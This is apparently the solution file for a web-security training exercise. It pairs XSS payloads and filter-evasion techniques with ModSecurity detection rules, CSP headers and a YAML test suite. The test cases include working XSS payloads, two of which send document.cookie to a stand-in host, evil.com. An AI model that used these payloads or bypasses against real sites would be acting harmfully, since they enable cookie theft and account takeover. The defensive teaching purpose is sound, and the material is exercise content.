# Solution 03: XSS Protection Rules

## Part A: XSS Contexts

| HTML Context | Example Code | XSS Payload | Why It Works |
|-------------|-------------|-------------|-------------|
| HTML body | `<div>{user_input}</div>` | `</div><script>alert(1)</script><div>` | Closes the original `<div>` tag, injects a script, then opens a new `<div>` to maintain valid HTML structure. |
| HTML attribute | `<input value="{user_input}">` | `" onmouseover="alert(1)` | Closes the `value` attribute with a quote, then adds an event handler attribute that executes JavaScript when the user hovers over the input. |
| JavaScript variable | `var name = "{user_input}";` | `"; alert(1);//` | Closes the string with `"`, ends the statement with `;`, calls `alert(1)`, then comments out the rest of the line with `//`. |
| URL parameter | `<a href="{user_input}">` | `javascript:alert(1)` | Uses the `javascript:` URI protocol. When the browser follows the link, it executes the JavaScript code instead of navigating to a URL. |
| CSS value | `<div style="color:{user_input}">` | `red; } </style><script>alert(1)</script><style>` | Closes the CSS rule, closes the `<style>` tag, injects a script, then opens a new `<style>` tag to maintain valid structure. |

### Why This Works

XSS works by breaking out of the current parsing context and injecting executable content. Each HTML context has different syntax rules:

- **HTML body**: The parser is looking for tags. Closing the current tag and opening a new one gives the attacker full control over the DOM.
- **HTML attributes**: The parser is looking for the closing quote. Breaking out of the attribute allows adding new attributes, including event handlers.
- **JavaScript**: The parser is looking for the closing quote and semicolon. Breaking out of the string context allows arbitrary code execution.
- **URL**: The browser treats `javascript:` as a protocol, just like `https:`. It executes the code that follows.
- **CSS**: Modern browsers do not execute CSS directly, but breaking out of the style context allows injecting HTML.

### Common Mistakes

- **Only thinking about the `<script>` tag.** Event handlers (`onload`, `onerror`, `onmouseover`) are equally dangerous and do not require a `<script>` tag.
- **Forgetting about JavaScript contexts.** XSS in JavaScript variables is different from XSS in HTML. The escape character is `"` or `'`, not `<`.
- **Ignoring the `javascript:` protocol.** This is one of the oldest XSS vectors and still works in many browsers.

---

## Part B: XSS Detection Rules

```apacheconf
# Rule 1: Script tag injection (provided in exercise)
SecRule ARGS|ARGS_NAMES|REQUEST_URI "@rx (?i)<script[\s>]" \
  "id:3001,phase:2,block,msg:'XSS: Script tag injection',severity:HIGH"

# Rule 2: Event handler injection
SecRule ARGS|ARGS_NAMES|REQUEST_URI "@rx (?i)\bon\w+\s*=" \
  "id:3002,phase:2,block,msg:'XSS: Event handler injection',severity:HIGH"

# Rule 3: Dangerous HTML tags
SecRule ARGS|ARGS_NAMES|REQUEST_URI "@rx (?i)<\s*(iframe|object|embed|svg|img|body|input|details|marquee|form|video|audio|base|link|meta|math|template)\b" \
  "id:3003,phase:2,block,msg:'XSS: Dangerous HTML tag injection',severity:HIGH"

# Rule 4: JavaScript/data URI protocol
SecRule ARGS|ARGS_NAMES|REQUEST_URI "@rx (?i)(javascript|data|vbscript)\s*:" \
  "id:3004,phase:2,block,msg:'XSS: Script URI protocol',severity:HIGH"

# Rule 5: Encoded XSS payloads
# URL-encoded script tags
SecRule ARGS|REQUEST_URI "@rx (?i)(%3C|&#0*60;|&#x0*3c;|\\u003c|\\x3c)" \
  "id:3005,phase:2,block,msg:'XSS: Encoded angle bracket detected',severity:MEDIUM"

# HTML entity encoded alert
SecRule ARGS "@rx (?i)&#0*(97|108|101|114|116)\s*;.*&#0*40\s*;" \
  "id:3006,phase:2,block,msg:'XSS: HTML entity encoded function call',severity:HIGH"

# Rule 6: Mutation XSS patterns
SecRule ARGS|REQUEST_URI "@rx (?i)<\s*noscript\b.*</\s*noscript\s*>.*<\s*(img|script|svg)\b" \
  "id:3007,phase:2,block,msg:'XSS: Mutation XSS pattern detected',severity:CRITICAL"

# Additional: Template injection (Angular, Vue, etc.)
SecRule ARGS "@rx \{\{.*constructor.*\}\}" \
  "id:3008,phase:2,block,msg:'XSS: Template injection detected',severity:HIGH"

# Additional: CSS expression injection
SecRule ARGS "@rx (?i)expression\s*\(" \
  "id:3009,phase:2,block,msg:'XSS: CSS expression injection',severity:HIGH"
```

### Why This Works

These rules cover the major XSS vectors:

1. **Event handlers** (Rule 2): Uses `\bon\w+\s*=` to match any event handler, not just the common ones. This catches `onload`, `onerror`, `onmouseover`, `onclick`, `onfocus`, and any future event handlers.

2. **Dangerous tags** (Rule 3): Covers all HTML tags that can execute code or load external resources. The list is comprehensive and includes tags that are often overlooked (`<details>`, `<marquee>`, `<template>`).

3. **Script URIs** (Rule 4): The `javascript:` protocol is the classic XSS vector in `href` and `src` attributes. Also covers `data:` (which can contain HTML) and `vbscript:` (IE-specific).

4. **Encoding evasion** (Rules 5-6): Matches URL-encoded, HTML entity-encoded, and Unicode-encoded angle brackets. This catches attackers who try to bypass basic `<script>` detection.

5. **Mutation XSS** (Rule 7): The `<noscript>` trick exploits differences between how the WAF and browser parse HTML. The WAF sees the content inside `<noscript>` as inactive, but the browser's parser transforms it into executable code.

### Common Mistakes

- **Only blocking `<script>` tags.** Event handlers on any HTML element can execute JavaScript. `<img src=x onerror=alert(1)>` is the most common XSS vector that bypasses `<script>`-only filters.
- **Not covering encoded payloads.** A single level of decoding is not enough. Attackers use double encoding, mixed encoding, and Unicode escapes.
- **Blocking all HTML tags.** If your application allows rich text (comments, profiles), blocking all HTML tags breaks legitimate functionality. Use an HTML sanitizer on the application side and a focused WAF rule on the WAF side.

---

## Part C: Security Headers

| Header | Value | What It Does |
|--------|-------|-------------|
| Content-Security-Policy | `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'` | Defines which sources of content the browser is allowed to load. Prevents inline scripts, external scripts, and data URIs for scripts. This is the most powerful XSS defense because it prevents script execution even if the attacker injects a `<script>` tag. |
| X-Content-Type-Options | `nosniff` | Prevents the browser from MIME-type sniffing. Without this, a browser might interpret a non-script response as JavaScript if it looks like code, enabling XSS. |
| X-XSS-Protection | `1; mode=block` | Enables the browser's built-in XSS filter (in older browsers). When an XSS attack is detected, the browser blocks the entire page rather than sanitizing the response. Note: This header is deprecated in modern browsers in favor of CSP. |
| X-Frame-Options | `DENY` | Prevents the page from being loaded in an iframe. This defends against clickjacking, which is a related attack where a user is tricked into clicking on a hidden iframe. |
| Referrer-Policy | `strict-origin-when-cross-origin` | Controls how much referrer information is sent with requests. Prevents leaking the full URL (which might contain sensitive data) to external sites. |

### Why This Works

Content-Security-Policy (CSP) is the most powerful XSS defense because it operates at the browser level, independent of the WAF:

- `script-src 'self'` means the browser will only execute scripts from the same origin. An injected `<script src="https://evil.com/steal.js">` will be blocked by the browser, even if the WAF misses the injection.
- `default-src 'self'` prevents loading any resources (images, fonts, stylesheets, connections) from external origins. This blocks data exfiltration even if the attacker achieves XSS.
- `frame-ancestors 'none'` prevents clickjacking by blocking iframe embedding.
- `base-uri 'self'` prevents `<base>` tag injection that could redirect all relative URLs to an attacker-controlled domain.

### Common Mistakes

- **Using `unsafe-inline` for scripts.** This defeats the purpose of CSP for XSS prevention. Use nonces or hashes for inline scripts that are necessary.
- **Not testing CSP before deployment.** A misconfigured CSP can break your application. Use `Content-Security-Policy-Report-Only` to test without enforcement.
- **Relying on X-XSS-Protection alone.** This header is deprecated and does not work in modern browsers. CSP is the correct replacement.

---

## Part D: Evasion Techniques

| # | Evasion Technique | Example | How It Bypasses Naive Filter | How to Detect It |
|---|------------------|---------|----------------------------|-----------------|
| 1 | Mixed case | `<ScRiPt>` | Case-sensitive filter matches only `<script>` exactly | Use `(?i)` flag for case-insensitive matching |
| 2 | Null bytes | `<scr%00ipt>` | Filter stops processing at null byte, sees `<scr` and `<ipt>` as separate tokens | Strip null bytes (`%00`, `\0`) before matching |
| 3 | Whitespace injection | `<script /src=...>` | Strict regex expects `<script>` with no whitespace before `>` | Use `\s*` for flexible whitespace matching |
| 4 | Tag fragmentation | `<scr ipt>` | Filter matches whole tokens; browser might reassemble the tag | Use fuzzy matching or normalize whitespace within tags |
| 5 | Encoding layers | `&#x3C;script>` | Single-level decoding produces `<script>`, but double encoding (`%26%23x3C%3B`) bypasses | Decode at multiple levels: URL decode, then HTML entity decode |
| 6 | SVG-based | `<svg/onload=alert(1)>` | Filter only checks `<script>` tags, not other executable elements | Match all executable HTML elements (svg, img, iframe, object, embed, body, video, audio, etc.) |
| 7 | Template injection | `{{constructor.constructor('alert(1)')()}}` | HTML-focused detection does not recognize template syntax | Add rules for Angular (`{{}}`), Vue (`v-bind:`, `v-on:`), and other template engines |

### Why This Works

Evasion techniques exploit the gap between how a filter parses input and how a browser parses HTML:

- The filter uses regex to find patterns in the raw input string.
- The browser uses a full HTML parser that normalizes, corrects, and interprets the input.
- When these two parsers disagree, the filter misses the attack.

The defense is to normalize input before matching: decode all encoding layers, strip null bytes, collapse whitespace, and use flexible regex patterns that account for the browser's parsing behavior.

### Common Mistakes

- **Only decoding once.** Double encoding (`%253C` -> `%3C` -> `<`) bypasses single-level decoding. Decode iteratively until the input stops changing.
- **Not covering all executable elements.** `<script>` is not the only way to execute JavaScript. `<svg onload>`, `<img onerror>`, `<iframe src=javascript:>` all execute code.
- **Ignoring template syntax.** Modern frameworks (Angular, Vue, Svelte) have their own template syntax that can be exploited for XSS. WAF rules must cover these patterns.

---

## Part E: Test Payloads

```yaml
reflected_xss:
  - name: "Basic script tag"
    payload: "<script>alert(document.domain)</script>"
    should_block: true
  - name: "Event handler in attribute"
    payload: "\" onfocus=\"alert(1)\" autofocus=\""
    should_block: true
  - name: "SVG-based XSS"
    payload: "<svg/onload=alert(1)>"
    should_block: true
  - name: "Legitimate search term"
    payload: "best restaurants near me"
    should_block: false

stored_xss:
  - name: "Script in comment"
    payload: "Great post! <script>fetch('https://evil.com/?c='+document.cookie)</script>"
    should_block: true
  - name: "Image onerror in profile"
    payload: "<img src=x onerror='new Image().src=\"https://evil.com/?\"+document.cookie'>"
    should_block: true
  - name: "Encoded event handler"
    payload: "Check this out: &#60;img src=x onerror=alert(1)&#62;"
    should_block: true
  - name: "Legitimate comment with special chars"
    payload: "The price is $5.99 & the quality is A+ (5/5 stars)"
    should_block: false

dom_based_xss:
  - name: "Fragment-based DOM XSS"
    payload: "#<img src=x onerror=alert(1)>"
    should_block: true
    note: "Payload in URL fragment (after #) -- never sent to server, detected by client-side CSP"
  - name: "DOM sink exploitation"
    payload: "?name=<script>alert(1)</script>"
    should_block: true
    note: "Parameter value used in innerHTML -- detected by WAF on query parameter"
  - name: "JavaScript URI in DOM"
    payload: "javascript:alert(document.cookie)"
    should_block: true

evasion_tests:
  - name: "Double URL encoding"
    payload: "%253Cscript%253Ealert(1)%253C/script%253E"
    should_block: true
  - name: "HTML entity encoding"
    payload: "&#60;script&#62;alert(1)&#60;/script&#62;"
    should_block: true
  - name: "Mixed case"
    payload: "<ScRiPt>AlErT(1)</sCrIpT>"
    should_block: true
  - name: "Null byte injection"
    payload: "<scri%00pt>alert(1)</scri%00pt>"
    should_block: true
```

### Why This Works

The test suite covers:

1. **Three XSS types**: Reflected (URL parameter), stored (database-persisted), and DOM-based (client-side).
2. **Multiple encoding evasion**: URL encoding, HTML entity encoding, mixed case, null bytes.
3. **Negative tests**: Legitimate input that should not be blocked, ensuring the rules do not create false positives.
4. **Different contexts**: HTML body, attributes, JavaScript, and URLs.

### Common Mistakes

- **Not testing negative cases.** A test suite with only attack payloads tells you nothing about false positives.
- **Not testing encoding variations.** Attackers always try encoding evasion first. Test single-encoded, double-encoded, and mixed-encoded versions.
- **Ignoring DOM-based XSS.** DOM-based XSS never reaches the server, so WAF rules cannot detect it. CSP is the primary defense.

---

## Common Mistakes to Avoid

1. **Only blocking `<script>` tags.** Event handlers, SVG, CSS expressions, and template injection all execute JavaScript without `<script>` tags.

2. **Not implementing CSP.** CSP is the strongest XSS defense. A WAF without CSP is a single point of failure.

3. **Using `unsafe-inline` in CSP.** This defeats the purpose. Use nonces or hashes for necessary inline scripts.

4. **Not covering all encoding layers.** Single-level decoding is insufficient. Decode iteratively.

5. **Blocking all HTML in user content.** Use an HTML sanitizer (like DOMPurify) on the application side to allow safe HTML while the WAF blocks dangerous patterns.

## Key Takeaway

XSS protection requires defense in depth: WAF rules to block known patterns at the edge, output encoding in the application to prevent injection, and Content-Security-Policy in the browser to prevent execution. No single layer is sufficient. The WAF catches the majority of attacks, output encoding prevents the rest, and CSP provides the final safety net. Together, they make XSS exploitation extremely difficult even for sophisticated attackers.
